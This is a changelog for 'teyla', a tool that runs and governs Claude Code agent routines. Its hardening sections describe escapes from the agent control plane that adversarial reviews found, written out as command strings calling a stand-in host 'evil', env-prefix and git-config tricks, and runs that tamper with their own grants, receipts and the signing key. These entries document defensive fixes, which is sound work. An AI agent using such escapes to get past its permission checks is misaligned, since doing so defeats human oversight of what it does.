# Changelog

## 0.8.0 — 2026-09-11 — productization

The distance between "works for me" and "works for four people" is not a feature. It is
six pieces of plumbing — a shared key instead of accounts, no `user_id`, a backend on the
builder's laptop, no distribution path, an unmetered model key, no onboarding doc — each
locally correct for someone with no second user, each a wall the moment there is one.

- **`teyla platform`** — `~/.teyla/platform.toml` is the manifest of the resources bought
  once and reused by every product: server, domain, identity provider, mail sender, Apple
  API key, Play Console, model key, and one mode-0600 secrets file. It holds identifiers
  and env-var *names*; the command reports which names are present and never a value.
  Every missing resource prints the URL where it is created and the file and key where its
  value goes. `init`, `env-example`, `--json`, `--no-net`; exits 1 while anything is missing.
- **`teyla productize`** — a `[productize]` block in a repo's `teyla.toml` declares who it
  serves and who it should serve. Eight requirements are checked against the target:
  identity, tenancy, backend, distribution per platform, onboarding doc, secrets against
  `.env.example`, cost cap, and — for `public` only — a platform mail sender. A per-device
  app is exempt from the identity requirement; `family`/`testers` is deliberately an easier
  bar than `public`. `--owner-steps` merges every product's owner blockers with the
  platform's missing resources into one deduplicated numbered list, platform first.
- **`templates/platform/`** — the shared server, set up once: `provision-droplet.sh`,
  `setup-server.sh` (docker, ufw, unattended upgrades, a `deploy` user, one Caddy in front),
  a `Caddyfile` that imports each product's own site block, `add-product.sh <name> <port>`,
  and a ten-line runbook. A product is added by dropping a directory into `/srv`.
- **`teyla scaffold --kind app|service`** now writes the `[productize]` block, a
  `docs/GETTING-STARTED.md` addressed to a person who is not you, and `deploy/droplet/`
  fragments. Other kinds are untouched.
- **`docs/PRODUCTIZE.md`** — the method: why solo-built apps resist sharing, what to build
  for N from day one, the platform cost table, how to productize an app that already
  exists, and what changes at twenty users.


## 0.6.2 — 2026-09-10 — second hardening pass

- Newlines split segments; `#` is not a comment mid-token; `shell:env` is an allowlist; the run cannot read `~/.teyla` or the HMAC key; interpreters, copy tools and network tools need an explicit `shell:*` (documented as full trust); receipts carry a grants hash and both `promote` and `inbox approve` require it unchanged; `fs.write:*` is the repo root only; `net:` is exact host or `*.domain`.

## Unreleased — control plane hardened again

A second adversarial review, against the code 0.6.1 shipped. Every item has a test
carrying the input that worked against the hardened version, in
`tests/test_control.py` §12.

**Breaking.** `inbox approve` now refuses *any* manifest change since the draft —
a loosened cap and a narrowed capability list included, not only a widening — and
`promote` resets the streak when `capabilities` or `caps` change, not only `act`.
Interpreters, copiers and network clients (`python`, `sh`, `cp`, `tee`, `ln`,
`curl`, `git -c`, …) need `shell:*`; a grant naming one of them is refused. And
`shell:env` is an allowlist: `TEYLA_*`, `LANG`, `LC_*`, `TZ`, `NO_COLOR`,
`PAGER=cat`, nothing else.

- Newlines and carriage returns split Bash segments (`git push\ncurl evil` was one
  granted segment); `#` is literal mid-token (`main#;curl evil` lexed to a push).
- `shell:env` allowlisted, so `GIT_SSH_COMMAND=curl git push` and `HOME=runs git
  push` are refused; `shell:*` documented as full trust, equivalent to no grants.
- `Read`/`Grep`/`Glob`/`LS` refused on `~/.teyla/**` and on control basenames —
  `~/.teyla/hmac.key` signs the action log the receipt is built from — and a Bash
  command naming `.teyla` or `hmac` is refused case-insensitively, quotes stripped.
- Receipts carry a `grants_hash` (capabilities + caps); `promote` and `approve`
  both require it to match the current manifest.
- `fs.write:*` is the repo root, not the filesystem: no relative glob leaves the
  product repo, and reaching outside takes an absolute grant.
- A bare `tool:Skill` grants no skill; control basenames match case-insensitively;
  a `net:` grant is an exact host or `*.domain`, so a bare TLD matches nothing.

## 0.6.1 — 2026-09-10 — control plane hardened after an adversarial review

- Shell grants on a real tokenizer: `&` splits segments; env prefixes need `shell:env` (and never `PATH=`, `GIT_CONFIG*`, `LD_*`, `DYLD_*`); every redirection target is a write; process substitution refused.
- Control files live under `~/.teyla/runs/<id>/`, never in the product tree; the hook refuses writes to them; the action log is HMAC-signed and tampered lines are counted in the receipt.
- `inbox approve` recomputes grants from the current manifest and refuses widening; the kill switch is re-read before every act step; `command` steps are checked against their own capabilities (**breaking**: manifests need `shell:<verb>`).
- realpath before glob matching; `*` no longer crosses `/`; `Task`/`Skill` need grants; critic must answer exactly `PASS`; counters under flock; context hashes cover the tree; date keys use the trigger's timezone; promotion needs ten consecutive clean receipts bound to the act spec.

## Unreleased — control-plane hardening

From an adversarial review of the 0.6.0 control plane. Every item below has a test
carrying the input that worked before the fix, in `tests/test_control.py` §11.

**Breaking.** A `command` step is now checked against the routine's own
`capabilities` before it runs — it never meets the PreToolUse hook, so this is the
only place it can be checked. An existing manifest whose steps run `echo` or
`./bin/x` needs `shell:echo` / `shell:./bin/x` declared, and `fs.write:` has to
cover anything a step redirects into. `teyla run --dry` shows what a routine has.

**Escapes closed in the shell checker.**
- `&` is a segment separator: `git push origin main & curl evil` no longer passes
  under `shell:git push`. Segments are cut with a real tokenizer, not a regex.
- An environment prefix needs `shell:env`, and `PATH=`, `GIT_CONFIG*`, `LD_*`,
  `DYLD_*` are refused even with it — the `GIT_CONFIG_KEY_0=alias.push` trick turned
  a `shell:git push` grant into arbitrary execution.
- Every redirection target is checked against `fs.write:`, and process substitution
  (`>(…)`, `<(…)`) is refused under every grant including `shell:*`.

**The run can no longer grade its own exam.** `grants.json`, `grants-state.json`,
`actions.jsonl`, `run.json` and the canonical `receipt.json` moved out of the
product's `runs/` (which `fs.write:runs/**` grants) into `~/.teyla/runs/<run-id>/`.
The hook refuses any write under `~/.teyla` and any write whose basename is a
control filename, regardless of grants. Each `actions.jsonl` line is HMAC-signed
(`~/.teyla/hmac.key`, 0600); unverifiable lines are dropped and the receipt says
`actions log tampered: N lines`. The repo keeps `draft.md`, `undo.md` and a receipt
copy.

**Other fixes.**
- `inbox approve` recomputes grants from the current `teyla.toml` instead of
  reloading the run's own `grants.json`, and refuses when the routine is gone or its
  capabilities have widened since the draft, printing the diff.
- The kill switch is re-read immediately before the act step, and before approve's.
- `fs.write:` globs resolve symlinks first, and `*` no longer crosses `/` — only
  `**` does, so `fs.write:*.md` stopped covering `.claude/rules/pwn.md`.
- `Task`/`Agent` need `tool:Agent`; `Skill` needs `tool:Skill:<name>` or
  `tool:Skill:*`; `SlashCommand` needs a `tool:` grant. None are read-only tools.
- The critic's first line must be exactly `PASS`; anything else is a FAIL.
- `max_writes`/`max_sends` are counted under `flock` across the whole
  read-decide-write, so parallel calls cannot both slip under a cap.
- `input-hash` expands context globs and hashes relative path + length-prefixed
  content, keyed by the routine ref; the `date` key uses the trigger's timezone.
- `promote` requires ten *consecutive* clean receipts and binds a hash of the act
  step into each receipt — editing `act` resets the streak.
- A session with no `TEYLA_GRANTS` while a run is in flight (`~/.teyla/active-runs/`)
  is refused rather than treated as an ordinary session. Residual: a nested
  `claude -p` inherits the environment, so the common case was already covered;
  an unrelated hand-started session during a run is refused too.

## 0.6.0 — 2026-09-10 — the control plane

- `teyla run <product:routine>`: the loop that runs a routine — capability grants, blast-radius caps, idempotency, gates A (needs you) / B (act and tell, with an undo note) / C (critic first), and a receipt per run naming the rules and grants it ran under.
- `teyla inbox`: the needs-you inbox; approve runs the act step under the same grants, reject files a correction candidate.
- `teyla kill on|off`: a global kill switch honoured by the run engine and by the hook on every tool call.
- `plugin/hooks/pre-tool-use.sh`: in a run, Claude Code may only use granted tools, shell verbs and write globs; every decision is logged to the receipt.
- `teyla triggers`: clock triggers become LaunchAgents. `teyla promote`: a gate is raised only on ten clean approvals. `teyla receipts`.
- Not built, and said so in docs/CONTROL-PLANE.md: event and webhook triggers, per-capability enforcement outside Claude Code, durable multi-step state; `shell:` grants can still write past `fs.write:` via redirection.

## 0.5.0 — 2026-09-09 — from the first corporate case study

- `teyla connectors`: per connector — read/write split, empty-or-error rate, median and p95 calls between your turns, rediscovery share; advice C1–C4. Skill reads (`SKILL.md`) counted beside invocations.
- `teyla plugins`: the skill / rule / fact quality pass over an installed plugin. `teyla plugin install|uninstall` for machines without the `claude` CLI.
- Advice: A3 uses active hours, not wall span; A8 skips absent harnesses; A10 respects `teyla policy ack`; A2/A4 suppressed for connector-heavy work in favour of A12.
- Fixes: `policy init --dry` is dry; `routines` exit 1 on unscheduled routines, 2 on untested checks, aligned columns; `sync-repo` refuses to collapse two differing files; `models --write-policy --drop-absent`.
- Docs: no-CLI second-opinion fallback in POLICY §2; three wiki review modes; kickoff prompt for no-CLI machines.

## 0.4.0 — 2026-09-09

- `teyla models [--days N] [--json] [--refresh]`: keeps the model ladder and prices current.
  Reads the models.dev catalogue (`~/.hermes/models_dev_cache.json`, opt-in `--refresh` network
  fetch only when stale/missing), the Grok and Codex CLI caches, Codex's configured model,
  models actually used in Claude Code in the last N days, and which providers have a credential
  present (presence only — never a value). Reports per provider and flags drift: LADDER-UNKNOWN,
  NEWER-AVAILABLE, NO-CREDENTIAL, UNLISTED-PROVIDER, PRICE-STALE; exits 1 on any flag.
- `teyla models --write-policy [--dry]`: rewrites the ladder table strictly between the
  `<!-- ladder:start -->`/`<!-- ladder:end -->` markers in `~/.agents/POLICY.md` — keeps every
  entry that still resolves, replaces one that doesn't with the newest of the same family, and
  appends a "reviewed `<date>` by teyla models" note. Prints the diff; touches nothing else in
  the file. `templates/POLICY.md` and `~/.agents/POLICY.md` both carry the markers now.
- `teyla models --write-prices`: writes `~/.teyla/prices.json` from the models.dev catalogue,
  tiered from the ladder. `pricing.py` now loads that file when present and falls back to its
  built-in `PRICES` table otherwise (`pricing.effective_prices()`).
- `advise.py` A11 "Model ladder drift": fires from the flags `monitor.metrics()` now folds in on
  every run (network-free — the embedded call never passes `--refresh`), action is
  `teyla models --write-policy`.
- `teyla routine install`'s weekly wrapper now also runs `teyla models`.

## 0.3.0 — 2026-09-09

- `teyla policy init --claude-md --ops-root-init`: global CLAUDE.md and an ops root from templates; `docs/HANDOVER.md` (the practices that travel to a second machine); kickoff prompt rewritten around them.

- Clean-install fixes: templates ship in the wheel; `policy init --owner`; `python -m teyla`.
- `teyla wiki init|status|lint|confirm` and the **wiki-pass** skill: the facts store as an LLM-maintained wiki (GitLab-Wiki compatible).
- `teyla feedback`: one redacted file for a second user to send back; GitHub issue templates.
- `teyla routines --issues`: a GitHub issue per broken manual check.
- `prompts/onboard.md`: paste-able setup prompt for an agent on a new machine.

## 0.2.0 — 2026-09-09

Routines and manual checks: the "does it actually run / does it actually
work" half.
- `teyla.toml`: a per-repo manifest of `[[routine]]` (launchd, cron, pg_cron,
  github-actions or script — the work that must run without a human) and
  `[[check]]` (the work a human tests by hand and confirms).
- `teyla routines [path...] [--json]`: one table per product — routine
  loaded/last-run/verdict (ok / NOT LOADED / STALE / unknown) and check
  status/confirmed/age/verdict (ok / BROKEN / UNTESTED / RE-TEST), a summary
  line, and exit code 1 when anything needs attention (so a cron can alert).
- `teyla routine install`: Teyla's own Monday 07:30 launchd weekly (monitor,
  routines, products, filed under the ops run-artifact layout). `teyla
  routine status` shows whether it is loaded and its last log lines.
- `teyla.toml` added to several private product repos from what was actually verified on this machine.

## 0.1.0 — 2026-09-09

First public cut.
- `teyla monitor` / `advise` / `sessions` / `corrections`: adoption report from local Claude Code, Codex, Grok and Hermes session logs, aggregates only, with advice rules A1–A10.
- `teyla policy`: one `~/.agents/POLICY.md` wired into Claude Code, Codex, Grok, Hermes and project `AGENTS.md`.
- `teyla harvest`: tool spines and corrections for the sessions that touched a path; feeds the harvest skill.
- `teyla scaffold`: a new repo born plug-and-play (AGENTS.md, check.sh, .env.example, LICENSE, CI, routines/).
- `teyla products`: real-usage counters across repos — the "built, not used" detector.
- Claude Code plugin: harvest and adoption-review skills, `/teyla:rule`, `/teyla:correct`, correction-capture hook.
- Portable prompts for machines where nothing can be installed (`prompts/`).
